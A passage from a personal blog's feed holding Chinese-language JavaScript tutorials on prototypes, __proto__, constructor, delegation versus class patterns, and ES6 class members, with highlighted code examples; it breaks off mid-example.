src="/2022/04/15/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%AF%B9%E8%B1%A1%E5%85%B3%E8%81%94%E5%8C%BA%E5%88%AB/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F.jpg" alt="原型模式"></p><h1 id="对象关联的委托模式"><a href="#对象关联的委托模式" class="headerlink" title="对象关联的委托模式"></a>对象关联的委托模式</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Foo=&#123;</span><br><span class="line">            <span class="attr">init</span>:<span class="function"><span class="keyword">function</span>(<span class="params">who</span>)</span>&#123;<span class="built_in">this</span>.me=who&#125;,</span><br><span class="line">            <span class="attr">identify</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="string">&quot;I am &quot;</span>+<span class="built_in">this</span>.me&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Bar=<span class="built_in">Object</span>.create(Foo);</span><br><span class="line">        Bar.speak=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">&quot;Hello&quot;</span>+<span class="built_in">this</span>.identify()+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> b1=<span class="built_in">Object</span>.create(Bar)</span><br><span class="line">        b1.init(<span class="string">&quot;b1&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> b2=<span class="built_in">Object</span>.create(Bar)</span><br><span class="line">        b2.init(<span class="string">&quot;b2&quot;</span>);</span><br><span class="line">        b1.speak();</span><br><span class="line">        b2.speak();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%AF%B9%E8%B1%A1%E5%85%B3%E8%81%94%E5%8C%BA%E5%88%AB/%E5%A7%94%E6%89%98%E6%A8%A1%E5%BC%8F.jpg" alt="委托模式"></p><h1 id="类设计模式"><a href="#类设计模式" class="headerlink" title="类设计模式"></a>类设计模式</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span>&#123;</span><br><span class="line">           <span class="function"><span class="title">constructor</span>(<span class="params">who</span>)</span>&#123;</span><br><span class="line">               <span class="keyword">var</span> me=who</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">           <span class="function"><span class="title">identify</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="string">&quot;I am &quot;</span>+<span class="built_in">this</span>.me</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="class"><span class="keyword">class</span> <span class="title">Bar</span> <span class="keyword">extends</span> <span class="title">Foo</span></span>&#123;</span><br><span class="line">           <span class="function"><span class="title">constructor</span>(<span class="params">who</span>)</span>&#123;</span><br><span class="line">               <span class="built_in">super</span>();<span class="comment">//这里super指的是父类的构造函数，相当于Foo.prototype.constructor.call(this);this指的是子类Bar</span></span><br><span class="line">               <span class="built_in">this</span>.me=who</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="function"><span class="title">speak</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">               alert(<span class="string">&quot;hello&quot;</span>+<span class="built_in">super</span>.identify())<span class="comment">//这里super作为对象，指的是父类的原型对象，相当于Foo.prototype</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">var</span> b1=<span class="keyword">new</span> Bar(<span class="string">&#x27;b1&#x27;</span>);</span><br><span class="line">       b1.speak();</span><br><span class="line">       <span class="keyword">var</span> b2=<span class="keyword">new</span> Bar(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">       b2.speak();</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;面向对象的原型模式：&quot;&gt;&lt;a href=&quot;#面向对象的原型模式：&quot; class=&quot;headerlink&quot; title=&quot;面向对象的原型模式：&quot;&gt;&lt;/a&gt;面向对象的原型模式：&lt;/h1&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>prototype,__proto__与costructor</title>
    <link href="https://coloey.github.io/2022/04/15/prototype-proto-%E4%B8%8Ecostructor/"/>
    <id>https://coloey.github.io/2022/04/15/prototype-proto-%E4%B8%8Ecostructor/</id>
    <published>2022-04-15T05:21:41.000Z</published>
    <updated>2022-04-15T09:33:11.616Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自（</p><p>[]: <a href="https://blog.csdn.net/cc18868876837/article/details/81211729%EF%BC%89">https://blog.csdn.net/cc18868876837/article/details/81211729）</a></p><p>文章目录</p><ol><li><p>前言</p></li><li><p>_ _ proto _ _ 属性</p></li><li><p>prototype属性</p></li><li><p>constructor属性</p></li><li><p>总结<br>提示：不要排斥，静下心来，认真读完，你就搞懂了！(可以先看一下最后的总结部分再回过头来完整看完)</p></li><li><p>前言<br>  作为一名前端工程师，必须搞懂JS中的prototype、_<em>proto__与constructor属性，相信很多初学者对这些属性存在许多困惑，容易把它们混淆，本文旨在帮助大家理清它们之间的关系并彻底搞懂它们。这里说明一点，__proto__属性的两边是各由两个下划线构成（这里为了方便大家看清，在两下划线之间加入了一个空格：</em> <em>proto</em> _，读作“dunder proto”，“double underscore proto”的缩写），实际上，该属性在ES标准定义中的名字应该是[[Prototype]]，具体实现是由浏览器代理自己实现，谷歌浏览器的实现就是将[[Prototype]]命名为__proto__，大家清楚这个标准定义与具体实现的区别即可（名字有所差异，功能是一样的），可以通过该方式检测引擎是否支持这个属性：Object.getPrototypeOf({<strong>proto</strong>: null}) === null。本文基于谷歌浏览器（版本 72.0.3626.121）的实验结果所得。<br>       现在正式开始！ 让我们从如下一个简单的例子展开讨论，并配以相关的图帮助理解：</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;...&#125;;</span><br><span class="line"><span class="keyword">let</span> f1 = <span class="keyword">new</span> Foo();</span><br><span class="line">                </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上代码表示创建一个构造函数Foo()，并用new关键字实例化该构造函数得到一个实例化对象f1。这里稍微补充一下new操作符将函数作为构造器进行调用时的过程：函数被调用，然后新创建一个对象，并且成了函数的上下文（也就是此时函数内部的this是指向该新创建的对象，这意味着我们可以在构造器函数内部通过this参数初始化值），最后返回该新对象的引用，详细请看：详解JavaScript中的new操作符。虽然是简简单单的两行代码，然而它们背后的关系却是错综复杂的，如下图所示：</p><p><img src="/2022/04/15/prototype-proto-%E4%B8%8Ecostructor/1.png" alt="1"></p><p>看到这图别怕，让我们一步步剖析，彻底搞懂它们！<br>  图的说明：右下角为图例，红色箭头表示__proto__属性指向、绿色箭头表示prototype属性的指向、棕色实线箭头表示本身具有的constructor属性的指向，棕色虚线箭头表示继承而来的constructor属性的指向；蓝色方块表示对象，浅绿色方块表示函数（这里为了更好看清，Foo()仅代表是函数，并不是指执行函数Foo后得到的结果，图中的其他函数同理）。图的中间部分即为它们之间的联系，图的最左边即为例子代码。</p><ol start="2"><li><p>__ proto __ 属性<br>  首先，我们需要牢记两点：</p><p>  ①____proto____和constructor属性是<strong>对象</strong>所独有的；② prototype属性是<strong>函数</strong>所独有的。但是由于JS中函数也是一种对象，所以函数也拥有__proto__和constructor属性，这点是致使我们产生困惑的很大原因之一。上图有点复杂，我们把它按照属性分别拆开，然后进行分析：</p><p>  <img src="/2022/04/15/prototype-proto-%E4%B8%8Ecostructor/2.png" alt="2"></p></li></ol><p>  第一，这里我们仅留下 <strong>proto</strong> 属性，它是对象所独有的，可以看到__proto__属性都是由一个对象指向一个对象，即指向它们的原型对象（也可以理解为父对象），那么这个属性的作用是什么呢？它的作用就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的__proto__属性所指向的那个对象（可以理解为父对象）里找，如果父对象也不存在这个属性，则继续往父对象的__proto__属性所指向的那个对象（可以理解为爷爷对象）里找，如果还没找到，则继续往上找…直到原型链顶端null（可以理解为原始人。。。），再往上找就相当于在null上取值，会报错（可以理解为，再往上就已经不是“人”的范畴了，找不到了，到此结束，null为原型链的终点），由以上这种通过__proto__属性来连接对象直到null的一条链即为我们所谓的原型链。<br>  其实我们平时调用的字符串方法、数组方法、对象方法、函数方法等都是靠__proto__继承而来的。</p><ol start="3"><li>prototype属性<br>  第二，接下来我们看 prototype 属性：</li></ol><p>  <img src="/2022/04/15/prototype-proto-%E4%B8%8Ecostructor/3-16500005636262.png" alt="3"><br>  <br>    prototype属性，别忘了一点，就是我们前面提到要牢记的两点中的第二点，它是函数所独有的，（除了Object基本类型），<strong>它是从一个函数指向一个对象。它的含义是函数的原型对象</strong>，也就是这个函数（其实所有函数都可以作为构造函数)所创建的实例的原型对象，由此可知：f1.<strong>proto</strong> === Foo.prototype，它们两个完全一样。那prototype属性的作用又是什么呢？它的作用就是包含可以由特定类型的所有实例共享的属性和方法，也就是让该函数所实例化的对象们都可以找到公用的属性和方法。任何函数在创建的时候，其实会默认同时创建该函数的prototype对象。<br>  <br>4. constructor属性<br>  最后，我们来看一下 constructor 属性：<img src="/2022/04/15/prototype-proto-%E4%B8%8Ecostructor/4.png"><br>      constructor属性也是<strong>对象</strong>才拥有的，它是从一个对象指向一个函数，含义就是指向该对象的构造函数，每个对象都有构造函数（本身拥有或继承而来，继承而来的要结合__proto__属性查看会更清楚点，如下图所示），从上图中可以看出Function这个对象比较特殊，它的构造函数就是它自己（因为Function可以看成是一个函数，也可以是一个对象)，所有函数和对象最终都是由Function构造函数得来，所以constructor属性的终点就是Function这个函数。</p><p>  感谢网友的指出，这里解释一下上段中“每个对象都有构造函数”这句话。这里的意思是<strong>每个对象都可以找到其对应的constructor，因为创建对象的前提是需要有constructor，而这个constructor可能是对象自己本身显式定义的或者通过proto在原型链中找到的</strong>。而单从constructor这个属性来讲，<strong>只有prototype对象才有</strong>。每个函数在创建的时候，JS会同时创建一个该函数对应的prototype对象，而函数创建的对象.<strong>proto</strong> === 该函数.prototype，该函数.prototype.constructor===该函数本身，故通过函数创建的对象即使自己没有constructor属性，它也能通过__proto__找到对应的constructor，所以任何对象最终都可以找到其构造函数（null如果当成对象的话，将null除外）。如下：</p><ol start="5"><li>总结<br>   总结一下：</li></ol><p>我们需要牢记两点：</p><p>①__proto__和constructor属性是对象所独有的；</p><p>② prototype属性是函数所独有的，因为函数也是一种对象，所以函数也拥有__proto__和constructor属性。<br>__proto__属性的作用就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的__proto__属性所指向的那个对象（父对象）里找，一直找，直到__proto__属性的终点null，再往上找就相当于在null上取值，会报错。通过__proto__属性将对象连接起来的这条链路即我们所谓的原型链。<br>prototype属性的作用就是让该函数所实例化的对象们都可以找到公用的属性和方法，即f1.<strong>proto</strong> === Foo.prototype。<br>constructor属性的含义就是指向该对象的构造函数，所有函数（此时看成对象了）最终的构造函数都指向Function。<br>  本文就此结束了，希望对那些对JS中的prototype、__proto__与constructor属性有困惑的同学有所帮助。</p><p>最后，感谢这两篇博文，本文中的部分内容参考自这两篇博文：</p><p>一张图理解prototype、proto和constructor的三角关系<br>prototype和__proto__的关系是什么？<br>小彩蛋：实现继承（相对完美、优雅）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inherit</span>(<span class="params">Child, Parent</span>) </span>&#123;</span><br><span class="line">     <span class="comment">// 继承原型上的属性 </span></span><br><span class="line">    Child.prototype = <span class="built_in">Object</span>.create(Parent.prototype)</span><br><span class="line">     <span class="comment">// 修复 constructor</span></span><br><span class="line">    Child.prototype.constructor = Child</span><br><span class="line">    <span class="comment">// 存储超类</span></span><br><span class="line">    Child.super = Parent</span><br><span class="line">    <span class="comment">// 静态属性继承</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Object</span>.setPrototypeOf) &#123;</span><br><span class="line">        <span class="comment">// setPrototypeOf es6</span></span><br><span class="line">        <span class="built_in">Object</span>.setPrototypeOf(Child, Parent)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Child.__proto__) &#123;</span><br><span class="line">        <span class="comment">// __proto__ es6 引入，但是部分浏览器早已支持</span></span><br><span class="line">        Child.__proto__ = Parent</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 兼容 IE10 等陈旧浏览器</span></span><br><span class="line">        <span class="comment">// 将 Parent 上的静态属性和方法拷贝一份到 Child 上，不会覆盖 Child 上的方法</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> Parent) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Parent.hasOwnProperty(k) &amp;&amp; !(k <span class="keyword">in</span> Child)) &#123;</span><br><span class="line">                Child[k] = Parent[k]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自（&lt;/p&gt;
&lt;p&gt;[]: &lt;a href=&quot;https://blog.csdn.net/cc18868876837/article/details/81211729%EF%BC%89&quot;&gt;https://blog.csdn.net/cc18868876837/art</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>类</title>
    <link href="https://coloey.github.io/2022/04/15/%E7%B1%BB/"/>
    <id>https://coloey.github.io/2022/04/15/%E7%B1%BB/</id>
    <published>2022-04-15T02:03:02.000Z</published>
    <updated>2022-04-15T14:21:17.594Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类构造函数"><a href="#类构造函数" class="headerlink" title="类构造函数"></a>类构造函数</h1><p>方法名constructor会告诉解释器在使用new操作符创建类的新实例时，应该调用这个函数，构造函数的定义不是必须的，不定义构造函数相当于将构造函数定义为空函数</p><h2 id="使用new调用类的构造函数会执行如下操作："><a href="#使用new调用类的构造函数会执行如下操作：" class="headerlink" title="使用new调用类的构造函数会执行如下操作："></a>使用new调用类的构造函数会执行如下操作：</h2><ul><li>在内存中创建一个新对象</li><li><strong>这个新对象内部的[[Prototype]]即__proto__指针被赋值为构造函数的prototype属性</strong></li><li>构造函数内部的this被赋值为这个新对象（即this指向新对象）</li><li>执行构造函数内部的代码（给新对象添加属性）</li><li>如果构造函数返回非空对象，则返回该对象；否则，返回刚创建的新对象</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> p1=<span class="keyword">new</span> Person();</span><br><span class="line">        <span class="built_in">console</span>.log(p1.__proto__===Person.prototype);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>默认情况下，类构造函数会在执行后返回this对象，构造函数返回的对象会被用作实例化的对象，如果没用引用新创建的this对象，那么这个对象会被销毁。不过，如果，返回的不是this对象，而是其他对象，那么这个对象不会通过instanceof操作符检测出跟类有关联。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">          <span class="function"><span class="title">constructor</span>(<span class="params">override</span>)</span>&#123;</span><br><span class="line">              <span class="built_in">this</span>.foo=<span class="string">&quot;foo&quot;</span>;</span><br><span class="line">              <span class="keyword">if</span>(override)&#123;</span><br><span class="line">                  <span class="keyword">return</span> &#123;</span><br><span class="line">                      <span class="attr">bar</span>:<span class="string">&quot;bar&quot;</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> p1=<span class="keyword">new</span> Person(),p2=<span class="keyword">new</span> Person(<span class="literal">true</span>);</span><br><span class="line">      <span class="built_in">console</span>.log(p1)</span><br><span class="line">      <span class="built_in">console</span>.log(p1 <span class="keyword">instanceof</span> Person);</span><br><span class="line">      <span class="built_in">console</span>.log(p2);<span class="comment">//没有引用构造函数创建的this对象，对象被销毁而返回的其他对象与类没有关系</span></span><br><span class="line">      <span class="built_in">console</span>.log(p2 <span class="keyword">instanceof</span> Person)</span><br></pre></td></tr></table></figure><h2 id="类构造函数与普通构造函数区别"><a href="#类构造函数与普通构造函数区别" class="headerlink" title="类构造函数与普通构造函数区别"></a>类构造函数与普通构造函数区别</h2><p>调用类构造函数必须使用new操作符，而普通构造函数如果不使用new调用，那么就会以全局的this作为内部对象，调用类构造函数<strong>没有使用new则会抛出错误</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p3=Person();<span class="comment">//TypeError</span></span><br></pre></td></tr></table></figure><p>类构造函数在实例化后，可以在实例上引用它</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> p1=<span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">//使用对类构造函数的引用创建一个新实例</span></span><br><span class="line"><span class="keyword">let</span> p2=<span class="keyword">new</span> p1.constructor();</span><br></pre></td></tr></table></figure><h2 id="把类当成特殊的函数"><a href="#把类当成特殊的函数" class="headerlink" title="把类当成特殊的函数"></a>把类当成特殊的函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(Person);<span class="comment">//class Person&#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> Person)<span class="comment">//function</span></span><br></pre></td></tr></table></figure><p><strong>类标识符有prototype属性，而这个原型也有一个constructor属性指向类自身</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">console</span>.log(Person===Person.prototype.constructor);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p><strong>使用instanceof检查一个对象和类构造函数，以确定对象是不是类的实例。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p=<span class="keyword">new</span> Person();</span><br><span class="line"><span class="built_in">console</span>.log(p <span class="keyword">instanceof</span> Person)<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>类本身具有和普通构造函数一样的行为，在类的上下文中，类本身使用new调用时就被当做构造函数，<strong>类中的constructor方法不会被当做构造函数，</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">let</span> p1=<span class="keyword">new</span> Person();</span><br><span class="line">       <span class="built_in">console</span>.log(p1 <span class="keyword">instanceof</span> Person);<span class="comment">//true</span></span><br><span class="line">       <span class="built_in">console</span>.log(p1.constructor=== Person);<span class="comment">//true</span></span><br><span class="line">       <span class="built_in">console</span>.log(p1 <span class="keyword">instanceof</span> Person.constructor)<span class="comment">//false</span></span><br><span class="line">       <span class="keyword">let</span> p2=<span class="keyword">new</span> Person.constructor();</span><br><span class="line">       <span class="built_in">console</span>.log(p2 <span class="keyword">instanceof</span> Person)<span class="comment">//false</span></span><br><span class="line">       <span class="built_in">console</span>.log(p2 .constructor=== Person);<span class="comment">//false</span></span><br><span class="line">       <span class="built_in">console</span>.log(p2 <span class="keyword">instanceof</span> Person.constructor)<span class="comment">//true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="实例，原型和类成员"><a href="#实例，原型和类成员" class="headerlink" title="实例，原型和类成员"></a>实例，原型和类成员</h1><h2 id="实例成员"><a href="#实例成员" class="headerlink" title="实例成员"></a>实例成员</h2><p>每次通过new调用类标识符时都会执行类构造函数，可以为新创建的实例this添加自有属性。<strong>每个实例都对应一个唯一的成员对象，所有成员都不会在原型上共享</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">           <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">               <span class="built_in">this</span>.name=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;Jack&#x27;</span>);</span><br><span class="line">               <span class="built_in">this</span>.sayName=<span class="function">()=&gt;</span><span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="function"><span class="title">sayAge</span>(<span class="params">age</span>)</span>&#123;</span><br><span class="line">               <span class="built_in">console</span>.log(age)</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">let</span> p1=<span class="keyword">new</span> Person(),p2=<span class="keyword">new</span> Person();</span><br><span class="line">       <span class="built_in">console</span>.log(p1.name===p2.name)<span class="comment">//false</span></span><br><span class="line">       <span class="built_in">console</span>.log(p1.sayAge(<span class="number">18</span>)===p2.sayAge(<span class="number">19</span>))<span class="comment">//true</span></span><br></pre></td></tr></table></figure><h2 id="原型方法"><a href="#原型方法" class="headerlink" title="原型方法"></a>原型方法</h2><p>为了在实例间共享方法，类定义语法在类块中定义的方法作为原型方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//在类块中定义的所有内容都会定义在类的原型上</span></span><br><span class="line"><span class="built_in">console</span>.log(p1.sayAge===Person.prototype.sayAge);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>可以把方法定义在类构造函数或者类块中，<strong>但不能在类块给原型添加原始值或对象作为成员数据</strong>,但是可以在类块外部手动添加成员数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person.greeting=<span class="string">&quot;My name is&quot;</span></span><br></pre></td></tr></table></figure><p>类方法等同于对象属性因此可以使用字符串，符号或计算的值作为键,</p><p>也支持获取和设置访问器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> symbolKey=<span class="built_in">Symbol</span>(<span class="string">&#x27;symbolkey&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>()</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">stringKey</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;invoked stringKey&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    [symbolKey]()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;invoked symbolKey&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="string">&#x27;computed&#x27;</span>+<span class="string">&#x27;Key&#x27;</span>]()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;invoked computedKey&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">set</span> <span class="title">name</span>(<span class="params">newvalue</span>)&#123;</span><br><span class="line">        <span class="built_in">this</span>.name_=newName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">get</span> <span class="title">name</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name_</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> p=<span class="keyword">new</span> Person()</span><br><span class="line">p.stringKey();</span><br><span class="line">p[symbolKey]();</span><br><span class="line">p.computedKey();</span><br><span class="line">p.name=<span class="string">&#x27;jake&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(p.name);<span class="comment">//Jake</span></span><br></pre></td></tr></table></figure><h2 id="静态类方法"><a href="#静态类方法" class="headerlink" title="静态类方法"></a>静态类方法</h2><p>这些方法通常用于执行<strong>不特定于实例的操作，也不要求存在类的实例</strong></p><p>与原型成员类似，静态成员每个类上只能有一个</p><p>静态类成员在类定义中使用static关键字作为前缀，在静态成员中，this引用类自身，其他所有约定跟原型成员一样，静态类方法适合作为实例工厂</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">            <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">this</span>.name=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;Jack&#x27;</span>);</span><br><span class="line">                <span class="built_in">this</span>.sayName=<span class="function">()=&gt;</span><span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="function"><span class="title">sayAge</span>(<span class="params">age</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(age)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">static</span> <span class="function"><span class="title">create</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> 